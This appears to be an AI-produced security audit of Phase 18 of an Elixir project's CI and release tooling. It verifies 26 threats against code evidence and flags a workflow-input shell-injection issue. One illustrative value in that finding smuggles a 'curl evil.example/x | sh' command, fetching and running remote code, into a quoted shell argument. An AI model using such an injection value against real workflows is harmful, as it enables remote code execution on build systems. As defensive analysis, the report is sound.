---
phase: 18-release-parity-gate-node-20-ci-cleanup
audited: 2026-04-17
re_audited: 2026-04-17
auditor: Claude (gsd-security-auditor)
asvs_level: 2
block_on: critical_and_high
threats_total: 26
threats_closed: 26
threats_open: 0
status: SECURED
---

# Phase 18: Security Audit

## Scope

Verify that every threat declared in the 7 `<threat_model>` blocks of Phase 18 PLAN.md files has a corresponding mitigation present in the implemented code (or is documented as `accept`ed). Implementation files are READ-ONLY; this audit does not patch gaps.

- 26 total threats (T-18-01-01 through T-18-07-03).
- 15 `mitigate` dispositions — each requires grep-verifiable evidence in cited files.
- 11 `accept` dispositions — require presence in the accepted-risks log below.
- 0 `transfer` dispositions.

A parallel code-review (18-REVIEW.md) surfaced 3 warnings (WR-01 duplicate Unreleased heading, WR-02 shell interpolation of `inputs.release_version` in `publish-hex.yml`, WR-03 OTP 28.0 vs 28.1 drift). WR-01 has been resolved (see Audit Trail). WR-02 is logged below as a NEW threat surface not covered by the original register; it remains a backlog item and is not blocking under ASVS L2.

## Threat Verification Matrix

### Plan 01 — Wave 0 test scaffolding

| Threat ID | Category | Disposition | Status | Evidence |
|-----------|----------|-------------|--------|----------|
| T-18-01-01 | T (Tampering) on mix.exs cli.preferred_envs | mitigate | CLOSED | `mix.exs:46-47` — surgical insertion of `"verify.workspace_clean": :test,` and `"verify.release_parity": :test,` between anchors `"verify.release_publish"` (L45) and `credo:` (L48). Pre-existing keys unchanged. |
| T-18-01-02 | I (Info Disclosure) test files reading workflow YAML | accept | CLOSED | Accepted risk (public repo). Module-constant paths in `test/mix/tasks/workflow_wiring_test.exs` — no user-input surface. Listed in Accepted Risks Log below. |
| T-18-01-03 | E (Elevation of Privilege) D-04 bypass tracked by tests | mitigate | CLOSED | `test/mix/tasks/workflow_wiring_test.exs` asserts presence of `mix verify.workspace_clean` in all 3 publish paths. Silent removal breaks 3 tests. |

### Plan 02 — verify.workspace_clean

| Threat ID | Category | Disposition | Status | Evidence |
|-----------|----------|-------------|--------|----------|
| T-18-02-01 | T (Tampering) run/1 arg injection | mitigate | CLOSED | `lib/mix/tasks/verify.workspace_clean.ex:37-39` uses `System.cmd("git", ["status", "--porcelain", "--" \| pathspecs], stderr_to_stdout: true)` — argv-list form, no shell. `ensure_no_args!/1` (L30, L74-80) rejects ANY argv before System.cmd. |
| T-18-02-02 | E (Elevation of Privilege) escape-hatch bypass | mitigate | CLOSED | Grep of `lib/mix/tasks/verify.workspace_clean.ex` finds NO `--allow-dirty`, `SCRYPATH_WORKSPACE_CLEAN_SKIP`, `allow_dirty`, `OptionParser.parse`, `:skip_check`, or `System.get_env` skip-guards. Workflow test file asserts presence of the step in all 3 publish paths. |
| T-18-02-03 | D (DoS) git status on massive tree | accept | CLOSED | Accepted risk. Pathspecs restricted to `package.files + test` (L61-72) bound scan scope. Listed in Accepted Risks Log. |
| T-18-02-04 | I (Info Disclosure) dirty-paths output | accept | CLOSED | Accepted risk. Output shows only local file paths (public). Listed in Accepted Risks Log. |

### Plan 03 — verify.release_parity

| Threat ID | Category | Disposition | Status | Evidence |
|-----------|----------|-------------|--------|----------|
| T-18-03-01 | T (Tampering / Injection) parse_version!/1 | mitigate | CLOSED | `lib/mix/tasks/verify.release_parity.ex:48` — `@version_regex ~r/^\d+\.\d+\.\d+([.-][A-Za-z0-9.-]+)?$/`. Applied at L54-55 BEFORE any `System.cmd`. `parse_version!/1` at L152-167 raises `Mix.Error` on non-match. Unit tests in `test/mix/tasks/verify_release_parity_test.exs` cover shell-meta, partial, v-prefix rejection. |
| T-18-03-02 | T (Tampering) Hex CDN MITM | mitigate (delegated) | CLOSED | `lib/mix/tasks/verify.release_parity.ex:187-191` delegates checksum verification to `mix hex.package fetch --unpack` (inner+outer checksum) — no hand-rolled hashing. |
| T-18-03-03 | I (Info Disclosure) drift output | accept | CLOSED | Accepted risk. Paths are public Hex + public git. Listed in Accepted Risks Log. |
| T-18-03-04 | D (DoS) unbounded retry on 429 | mitigate | CLOSED | `lib/mix/tasks/verify.release_parity.ex:129-146` — `retry_until!/4` uses `Enum.reduce_while(1..attempts, ...)` with hard `Mix.raise` on exhaustion (L142-143). `@default_attempts 10` (L42). `env_integer/2` at L293-304 enforces positive integer. |
| T-18-03-05 | T (Tampering) tmp_dir collision | mitigate | CLOSED | `lib/mix/tasks/verify.release_parity.ex:282-291` — `unique_tmp_dir!/0` uses `System.unique_integer([:positive])` suffix on `System.tmp_dir!()`. |
| T-18-03-06 | D (DoS) tmp_dir cleanup masking | mitigate | CLOSED | `lib/mix/tasks/verify.release_parity.ex:74-77` — `after File.rm_rf(tmp_root)` uses NON-BANG variant per Pitfall 4 (cleanup failures do not shadow original exception). |
| T-18-03-07 | I (Info Disclosure) tmp_dir predictable path | accept | CLOSED | Accepted risk. `System.tmp_dir!/0` is OS default; no secrets written. Listed in Accepted Risks Log. |

### Plan 04 — ci.yml Node-24 pin swap

| Threat ID | Category | Disposition | Status | Evidence |
|-----------|----------|-------------|--------|----------|
| T-18-04-01 | T (Tampering) action supply chain | accept (verified) | CLOSED | `actions/checkout@v6` (ci.yml:29, 56, 117, 164) and `actions/cache@v5` (ci.yml:36, 63, 124, 171) — official GitHub-maintained actions. Major-version pin is GitHub-recommended tradeoff. Listed in Accepted Risks Log. |
| T-18-04-02 | D (DoS) major-version breaking change | mitigate | CLOSED | `test/mix/tasks/workflow_wiring_test.exs` INFRA-03 describe asserts presence (4 checkout@v6 + 4 cache@v5) and refutes `@v4`. CI on the branch provides live verification. |
| T-18-04-03 | E (Elevation of Privilege) token scope change | accept | CLOSED | Accepted risk. `@v6` uses same `${{ github.token }}` scope as `@v4`; no documented permission-model change. Listed in Accepted Risks Log. |

### Plan 05 — workspace_clean workflow wiring

| Threat ID | Category | Disposition | Status | Evidence |
|-----------|----------|-------------|--------|----------|
| T-18-05-01 | E (Elevation of Privilege) silent removal of step | mitigate | CLOSED | `mix verify.workspace_clean` present in 3 files: `.github/workflows/ci.yml:78`, `.github/workflows/release-please.yml:68`, `.github/workflows/publish-hex.yml:45`. `workflow_wiring_test.exs` INFRA-01 describe asserts presence in all three (removing any breaks tests). |
| T-18-05-02 | T (Tampering) attacker adds --allow-dirty or continue-on-error | mitigate | CLOSED | Grep of `.github/workflows/` finds NO `--allow-dirty`, `SCRYPATH_WORKSPACE_CLEAN_SKIP`, or `continue-on-error: true` on any workspace_clean step. Plan acknowledges this is grep-enforced at commit review rather than test-enforced — documented limitation. |
| T-18-05-03 | D (DoS) workspace_clean false positive on CI | mitigate | CLOSED | CI does fresh checkout; `git status --porcelain` on clean checkout yields empty. Implementation at `lib/mix/tasks/verify.workspace_clean.ex:42-44` handles empty-output case as `:ok`. |
| T-18-05-04 | I (Info Disclosure) workflow logs surface paths | accept | CLOSED | Accepted risk. Paths from public `package.files` scope. Listed in Accepted Risks Log. |

### Plan 06 — verify-published-release.yml + issue template

| Threat ID | Category | Disposition | Status | Evidence |
|-----------|----------|-------------|--------|----------|
| T-18-06-01 | I (Info Disclosure) GITHUB_TOKEN logging | mitigate | CLOSED | `.github/workflows/verify-published-release.yml:94` — `GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}` in env block; no `echo` of token; standard GH Actions log-masking applies. |
| T-18-06-02 | E (Elevation of Privilege) over-broad permissions | mitigate | CLOSED | `.github/workflows/verify-published-release.yml:8-10` — `permissions: contents: read, issues: write` ONLY. No `pull-requests`, `packages`, `deployments`, etc. Least privilege satisfied. |
| T-18-06-03 | I (Info Disclosure) drift-issue body leaks private info | mitigate | CLOSED | `.github/ISSUE_TEMPLATE/release-parity-drift.md` body contains only public data: version string (L7, L11), public workflow run URL (L10), pointer to v1.2-MILESTONE-AUDIT.md (L15). No file contents, no secrets, no internal paths. |
| T-18-06-04 | D (DoS) scheduled file-storm | mitigate | CLOSED | `.github/workflows/verify-published-release.yml:97` — `update_existing: true` + `search_existing: open`. Issue title `.github/ISSUE_TEMPLATE/release-parity-drift.md:2` includes `{{ env.VERSION }}` for per-version disambiguation. |
| T-18-06-05 | R (Repudiation) continue-on-error to hide drift | mitigate | CLOSED | Grep of `.github/workflows/verify-published-release.yml` confirms NO `continue-on-error: true` on release_parity step (L83-88) or any other step. |
| T-18-06-06 | T (Tampering) create-an-issue@v2 supply chain | accept | CLOSED | Accepted risk. Pinned to major tag `@v2`. SHA-pinning documented as backlog item (not Phase 18 scope). Listed in Accepted Risks Log. |
| T-18-06-07 | S (Spoofing) actor impersonating scheduled runs | mitigate | CLOSED | `.github/workflows/verify-published-release.yml:91` — `if: ${{ failure() && github.event_name == 'schedule' && steps.resolve-version.outputs.published == 'true' }}`. `github.event_name` is set by GitHub's scheduler, cannot be forged by workflow_dispatch. |

### Plan 07 — Docs + CHANGELOG + closing commit

| Threat ID | Category | Disposition | Status | Evidence |
|-----------|----------|-------------|--------|----------|
| T-18-07-01 | R (Repudiation) commit subject diverges from D-22 | mitigate | CLOSED | `18-07-PLAN.md` human-verify checkpoint encodes the exact D-22 subject. Verification is operator-level (commit not yet made — checkpoint is in the `how-to-verify` block). Threat class is procedural, not code-level. |
| T-18-07-02 | I (Info Disclosure) CHANGELOG internal references | accept | CLOSED | Accepted risk. `.planning/milestones/v1.2-MILESTONE-AUDIT.md` is internal planning — not shipped in `package.files`. Adopters clicking the link get 404; acceptable (historical-traceability value for maintainers). Listed in Accepted Risks Log. |
| T-18-07-03 | T (Tampering) manual @version bump pre-empts release-please | mitigate | CLOSED | `mix.exs:4` reads `@version "0.3.0"` — UNCHANGED (no manual bump). Adjacent CHANGELOG hygiene blocker (duplicate `## [Unreleased]` stanza at former L80-82) RESOLVED by commit `91b8a57`. Re-audit confirms exactly one `## Unreleased` heading at `CHANGELOG.md:7` with Phase 18 Added/Changed/Notes content intact. Release-please input contract is now unambiguous. |

## OPEN Threats

_None — all 26 threats closed as of 2026-04-17 re-audit._

## Unregistered Flags (new threat surface identified during review)

### WR-02-NEW — Shell interpolation of `inputs.release_version` into grep in publish-hex.yml

- **File:** `.github/workflows/publish-hex.yml:39, 60` (also applies to `.github/workflows/release-please.yml:71, 86` with lower risk since the value comes from release-please output)
- **Category:** T (Tampering / Injection)
- **Description:** Both `grep -n "@version \"${{ inputs.release_version }}\"" mix.exs` (L39) and `mix verify.release_publish "${{ inputs.release_version }}"` (L60) splice a raw workflow-dispatch input directly into the generated shell script. Unlike `verify.release_parity` (regex-gated via `parse_version!/1`), the shell wrapping here accepts whatever the dispatcher typed. A value like `0.3.0"; curl evil.example/x | sh; echo "` would break out of the quoted context and execute arbitrary shell.
- **Gated threat model:** `workflow_dispatch` requires repository-write access, so this is primarily self-sabotage / insider-threat surface rather than unauthenticated RCE. It is nevertheless inconsistent with the defense-in-depth posture the Elixir tasks adopt.
- **NOT in original threat register:** Plan 06 and Plan 05 threat_model blocks did not enumerate `publish-hex.yml` `inputs.release_version` as an injection surface. This is a new finding surfaced by the code-review (WR-02).
- **Recommended mitigation:** Add a validation step at the top of `publish-hex.yml` that re-uses the same regex the Elixir task enforces:
  ```yaml
  - name: Validate release_version input
    run: |
      set -euo pipefail
      if ! printf '%s' "${{ inputs.release_version }}" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+([.-][A-Za-z0-9.-]+)?$'; then
        echo "release_version must be a canonical semver string" >&2
        exit 1
      fi
  ```
  Alternatively, bind to `env:` and use `"$RELEASE_VERSION"` (bash-quoted) rather than `${{ }}`-spliced.
- **Disposition recommendation:** MITIGATE — add the guard step in a follow-up commit. Log as new threat ID `T-18-08-01` in the next phase register.
- **Severity (ASVS L2):** Medium (gated by repo-write access). Not critical — does not block Phase 18 merge.
- **Status:** BACKLOG — carried forward as non-blocking under ASVS L2 block-on-critical-and-high policy.

## Accepted Risks Log

The following `accept` dispositions are documented as explicit decisions and require no code mitigation. Acceptance logged here satisfies the SECURITY.md verification requirement.

| Threat ID | Category | Component | Rationale |
|-----------|----------|-----------|-----------|
| T-18-01-02 | I | Test files reading workflow YAML | Public-repo workflow YAML; constant paths via `File.read!/1`; no user-input surface |
| T-18-02-03 | D | `git status` on massive working tree | Pathspecs restricted to `package.files + test` bound scan scope; any repo large enough to DoS would fail many other commands first |
| T-18-02-04 | I | Dirty-paths output echoed to Mix.raise | Output is local file paths only; runs on maintainer's machine or repo-scoped runner logs |
| T-18-03-03 | I | Drift output contents | File paths from public Hex tarball + public git tag; no secrets |
| T-18-03-07 | I | tmp_dir under predictable OS path | `System.tmp_dir!/0` is OS responsibility; no secrets written |
| T-18-04-01 | T | Action-version supply chain (`checkout@v6`, `cache@v5`) | Official GitHub-maintained actions; major-version pin is GitHub-recommended tradeoff |
| T-18-04-03 | E | Action token scope change `@v4 → @v6` | No documented permission-model change in checkout/cache release notes |
| T-18-05-04 | I | Workflow logs surface internal file paths | Paths from `package.files` scope only (all public) |
| T-18-06-06 | T | `JasonEtco/create-an-issue@v2` supply chain | Pinned to `@v2` major tag; SHA-pinning documented as backlog, not Phase 18 scope |
| T-18-07-02 | I | CHANGELOG references `.planning/` path not in tarball | Historical-traceability value is for maintainers, not adopters; 404 on HexDocs click-through is acceptable |

## Audit Trail

### 2026-04-17 — Initial Audit (State A)

- **Result:** OPEN_THREATS (25 closed / 1 open / 26 total)
- **Open:** T-18-07-03 (adjacent) — duplicate `## [Unreleased]` stanza at `CHANGELOG.md:80-82` created release-please input ambiguity (WR-01 from 18-REVIEW.md).
- **Unregistered flag:** WR-02-NEW (`inputs.release_version` shell-interpolation in `publish-hex.yml`) — non-blocking under ASVS L2.

### 2026-04-17 — Re-audit (State B)

- **Trigger:** Commit `91b8a57` (`fix(18): remove stale duplicate Unreleased block from CHANGELOG (closes T-18-07-03)`) removed the legacy `## [Unreleased]` stanza at L80-82.
- **Verification performed:**
  1. `grep -n "^## \[?Unreleased\]?"` on `CHANGELOG.md` returned exactly one match — `7:## Unreleased`.
  2. `CHANGELOG.md:7-20` Phase 18 Unreleased content intact:
     - `### Added` names `mix verify.workspace_clean` (L11) and `mix verify.release_parity` (L12).
     - `### Changed` names `actions/checkout@v6` and `actions/cache@v5` in `ci.yml` (L16).
     - `### Notes` references `.planning/milestones/v1.2-MILESTONE-AUDIT.md` (L20).
  3. Release-please-managed `## [0.3.0]` (L22+) and `## [0.2.0]` (L51+) stanzas unchanged.
- **Disposition:** T-18-07-03 transitioned OPEN → CLOSED. The 25 previously-closed threats are trusted per the prior audit's closure evidence (no re-scan of implementation files performed per re-audit scope).
- **Result:** SECURED (26 closed / 0 open / 26 total)

## Summary

- **Closed:** 26 / 26 threats (15 mitigate verified by grep/evidence; 11 accept present in log).
- **Open:** 0 threats.
- **New threat surface (backlog):** 1 unregistered finding (WR-02-NEW: `inputs.release_version` shell-interpolation in `publish-hex.yml`) — non-blocking under ASVS L2 block-on-critical-and-high policy. Recommended to register as `T-18-08-01` in the next phase.

**ASVS Level 2 posture:** Strong. All critical STRIDE categories (T/I/S/D/E/R) on the in-scope `mitigate` threats have explicit, grep-verifiable mitigations. The previously-open CHANGELOG hygiene issue (WR-01 / T-18-07-03-adjacent) has been resolved, eliminating the release-please input-contract ambiguity. The remaining unregistered finding (WR-02) is a gated injection surface (repo-write required) and does not block phase merge.

**Block-on-critical-and-high:** No critical or high findings. Phase 18 is cleared to proceed to the closing commit per D-22.

---

_Audited: 2026-04-17_
_Re-audited: 2026-04-17 (post-commit 91b8a57)_
_Auditor: Claude (gsd-security-auditor)_
_ASVS Level: 2_
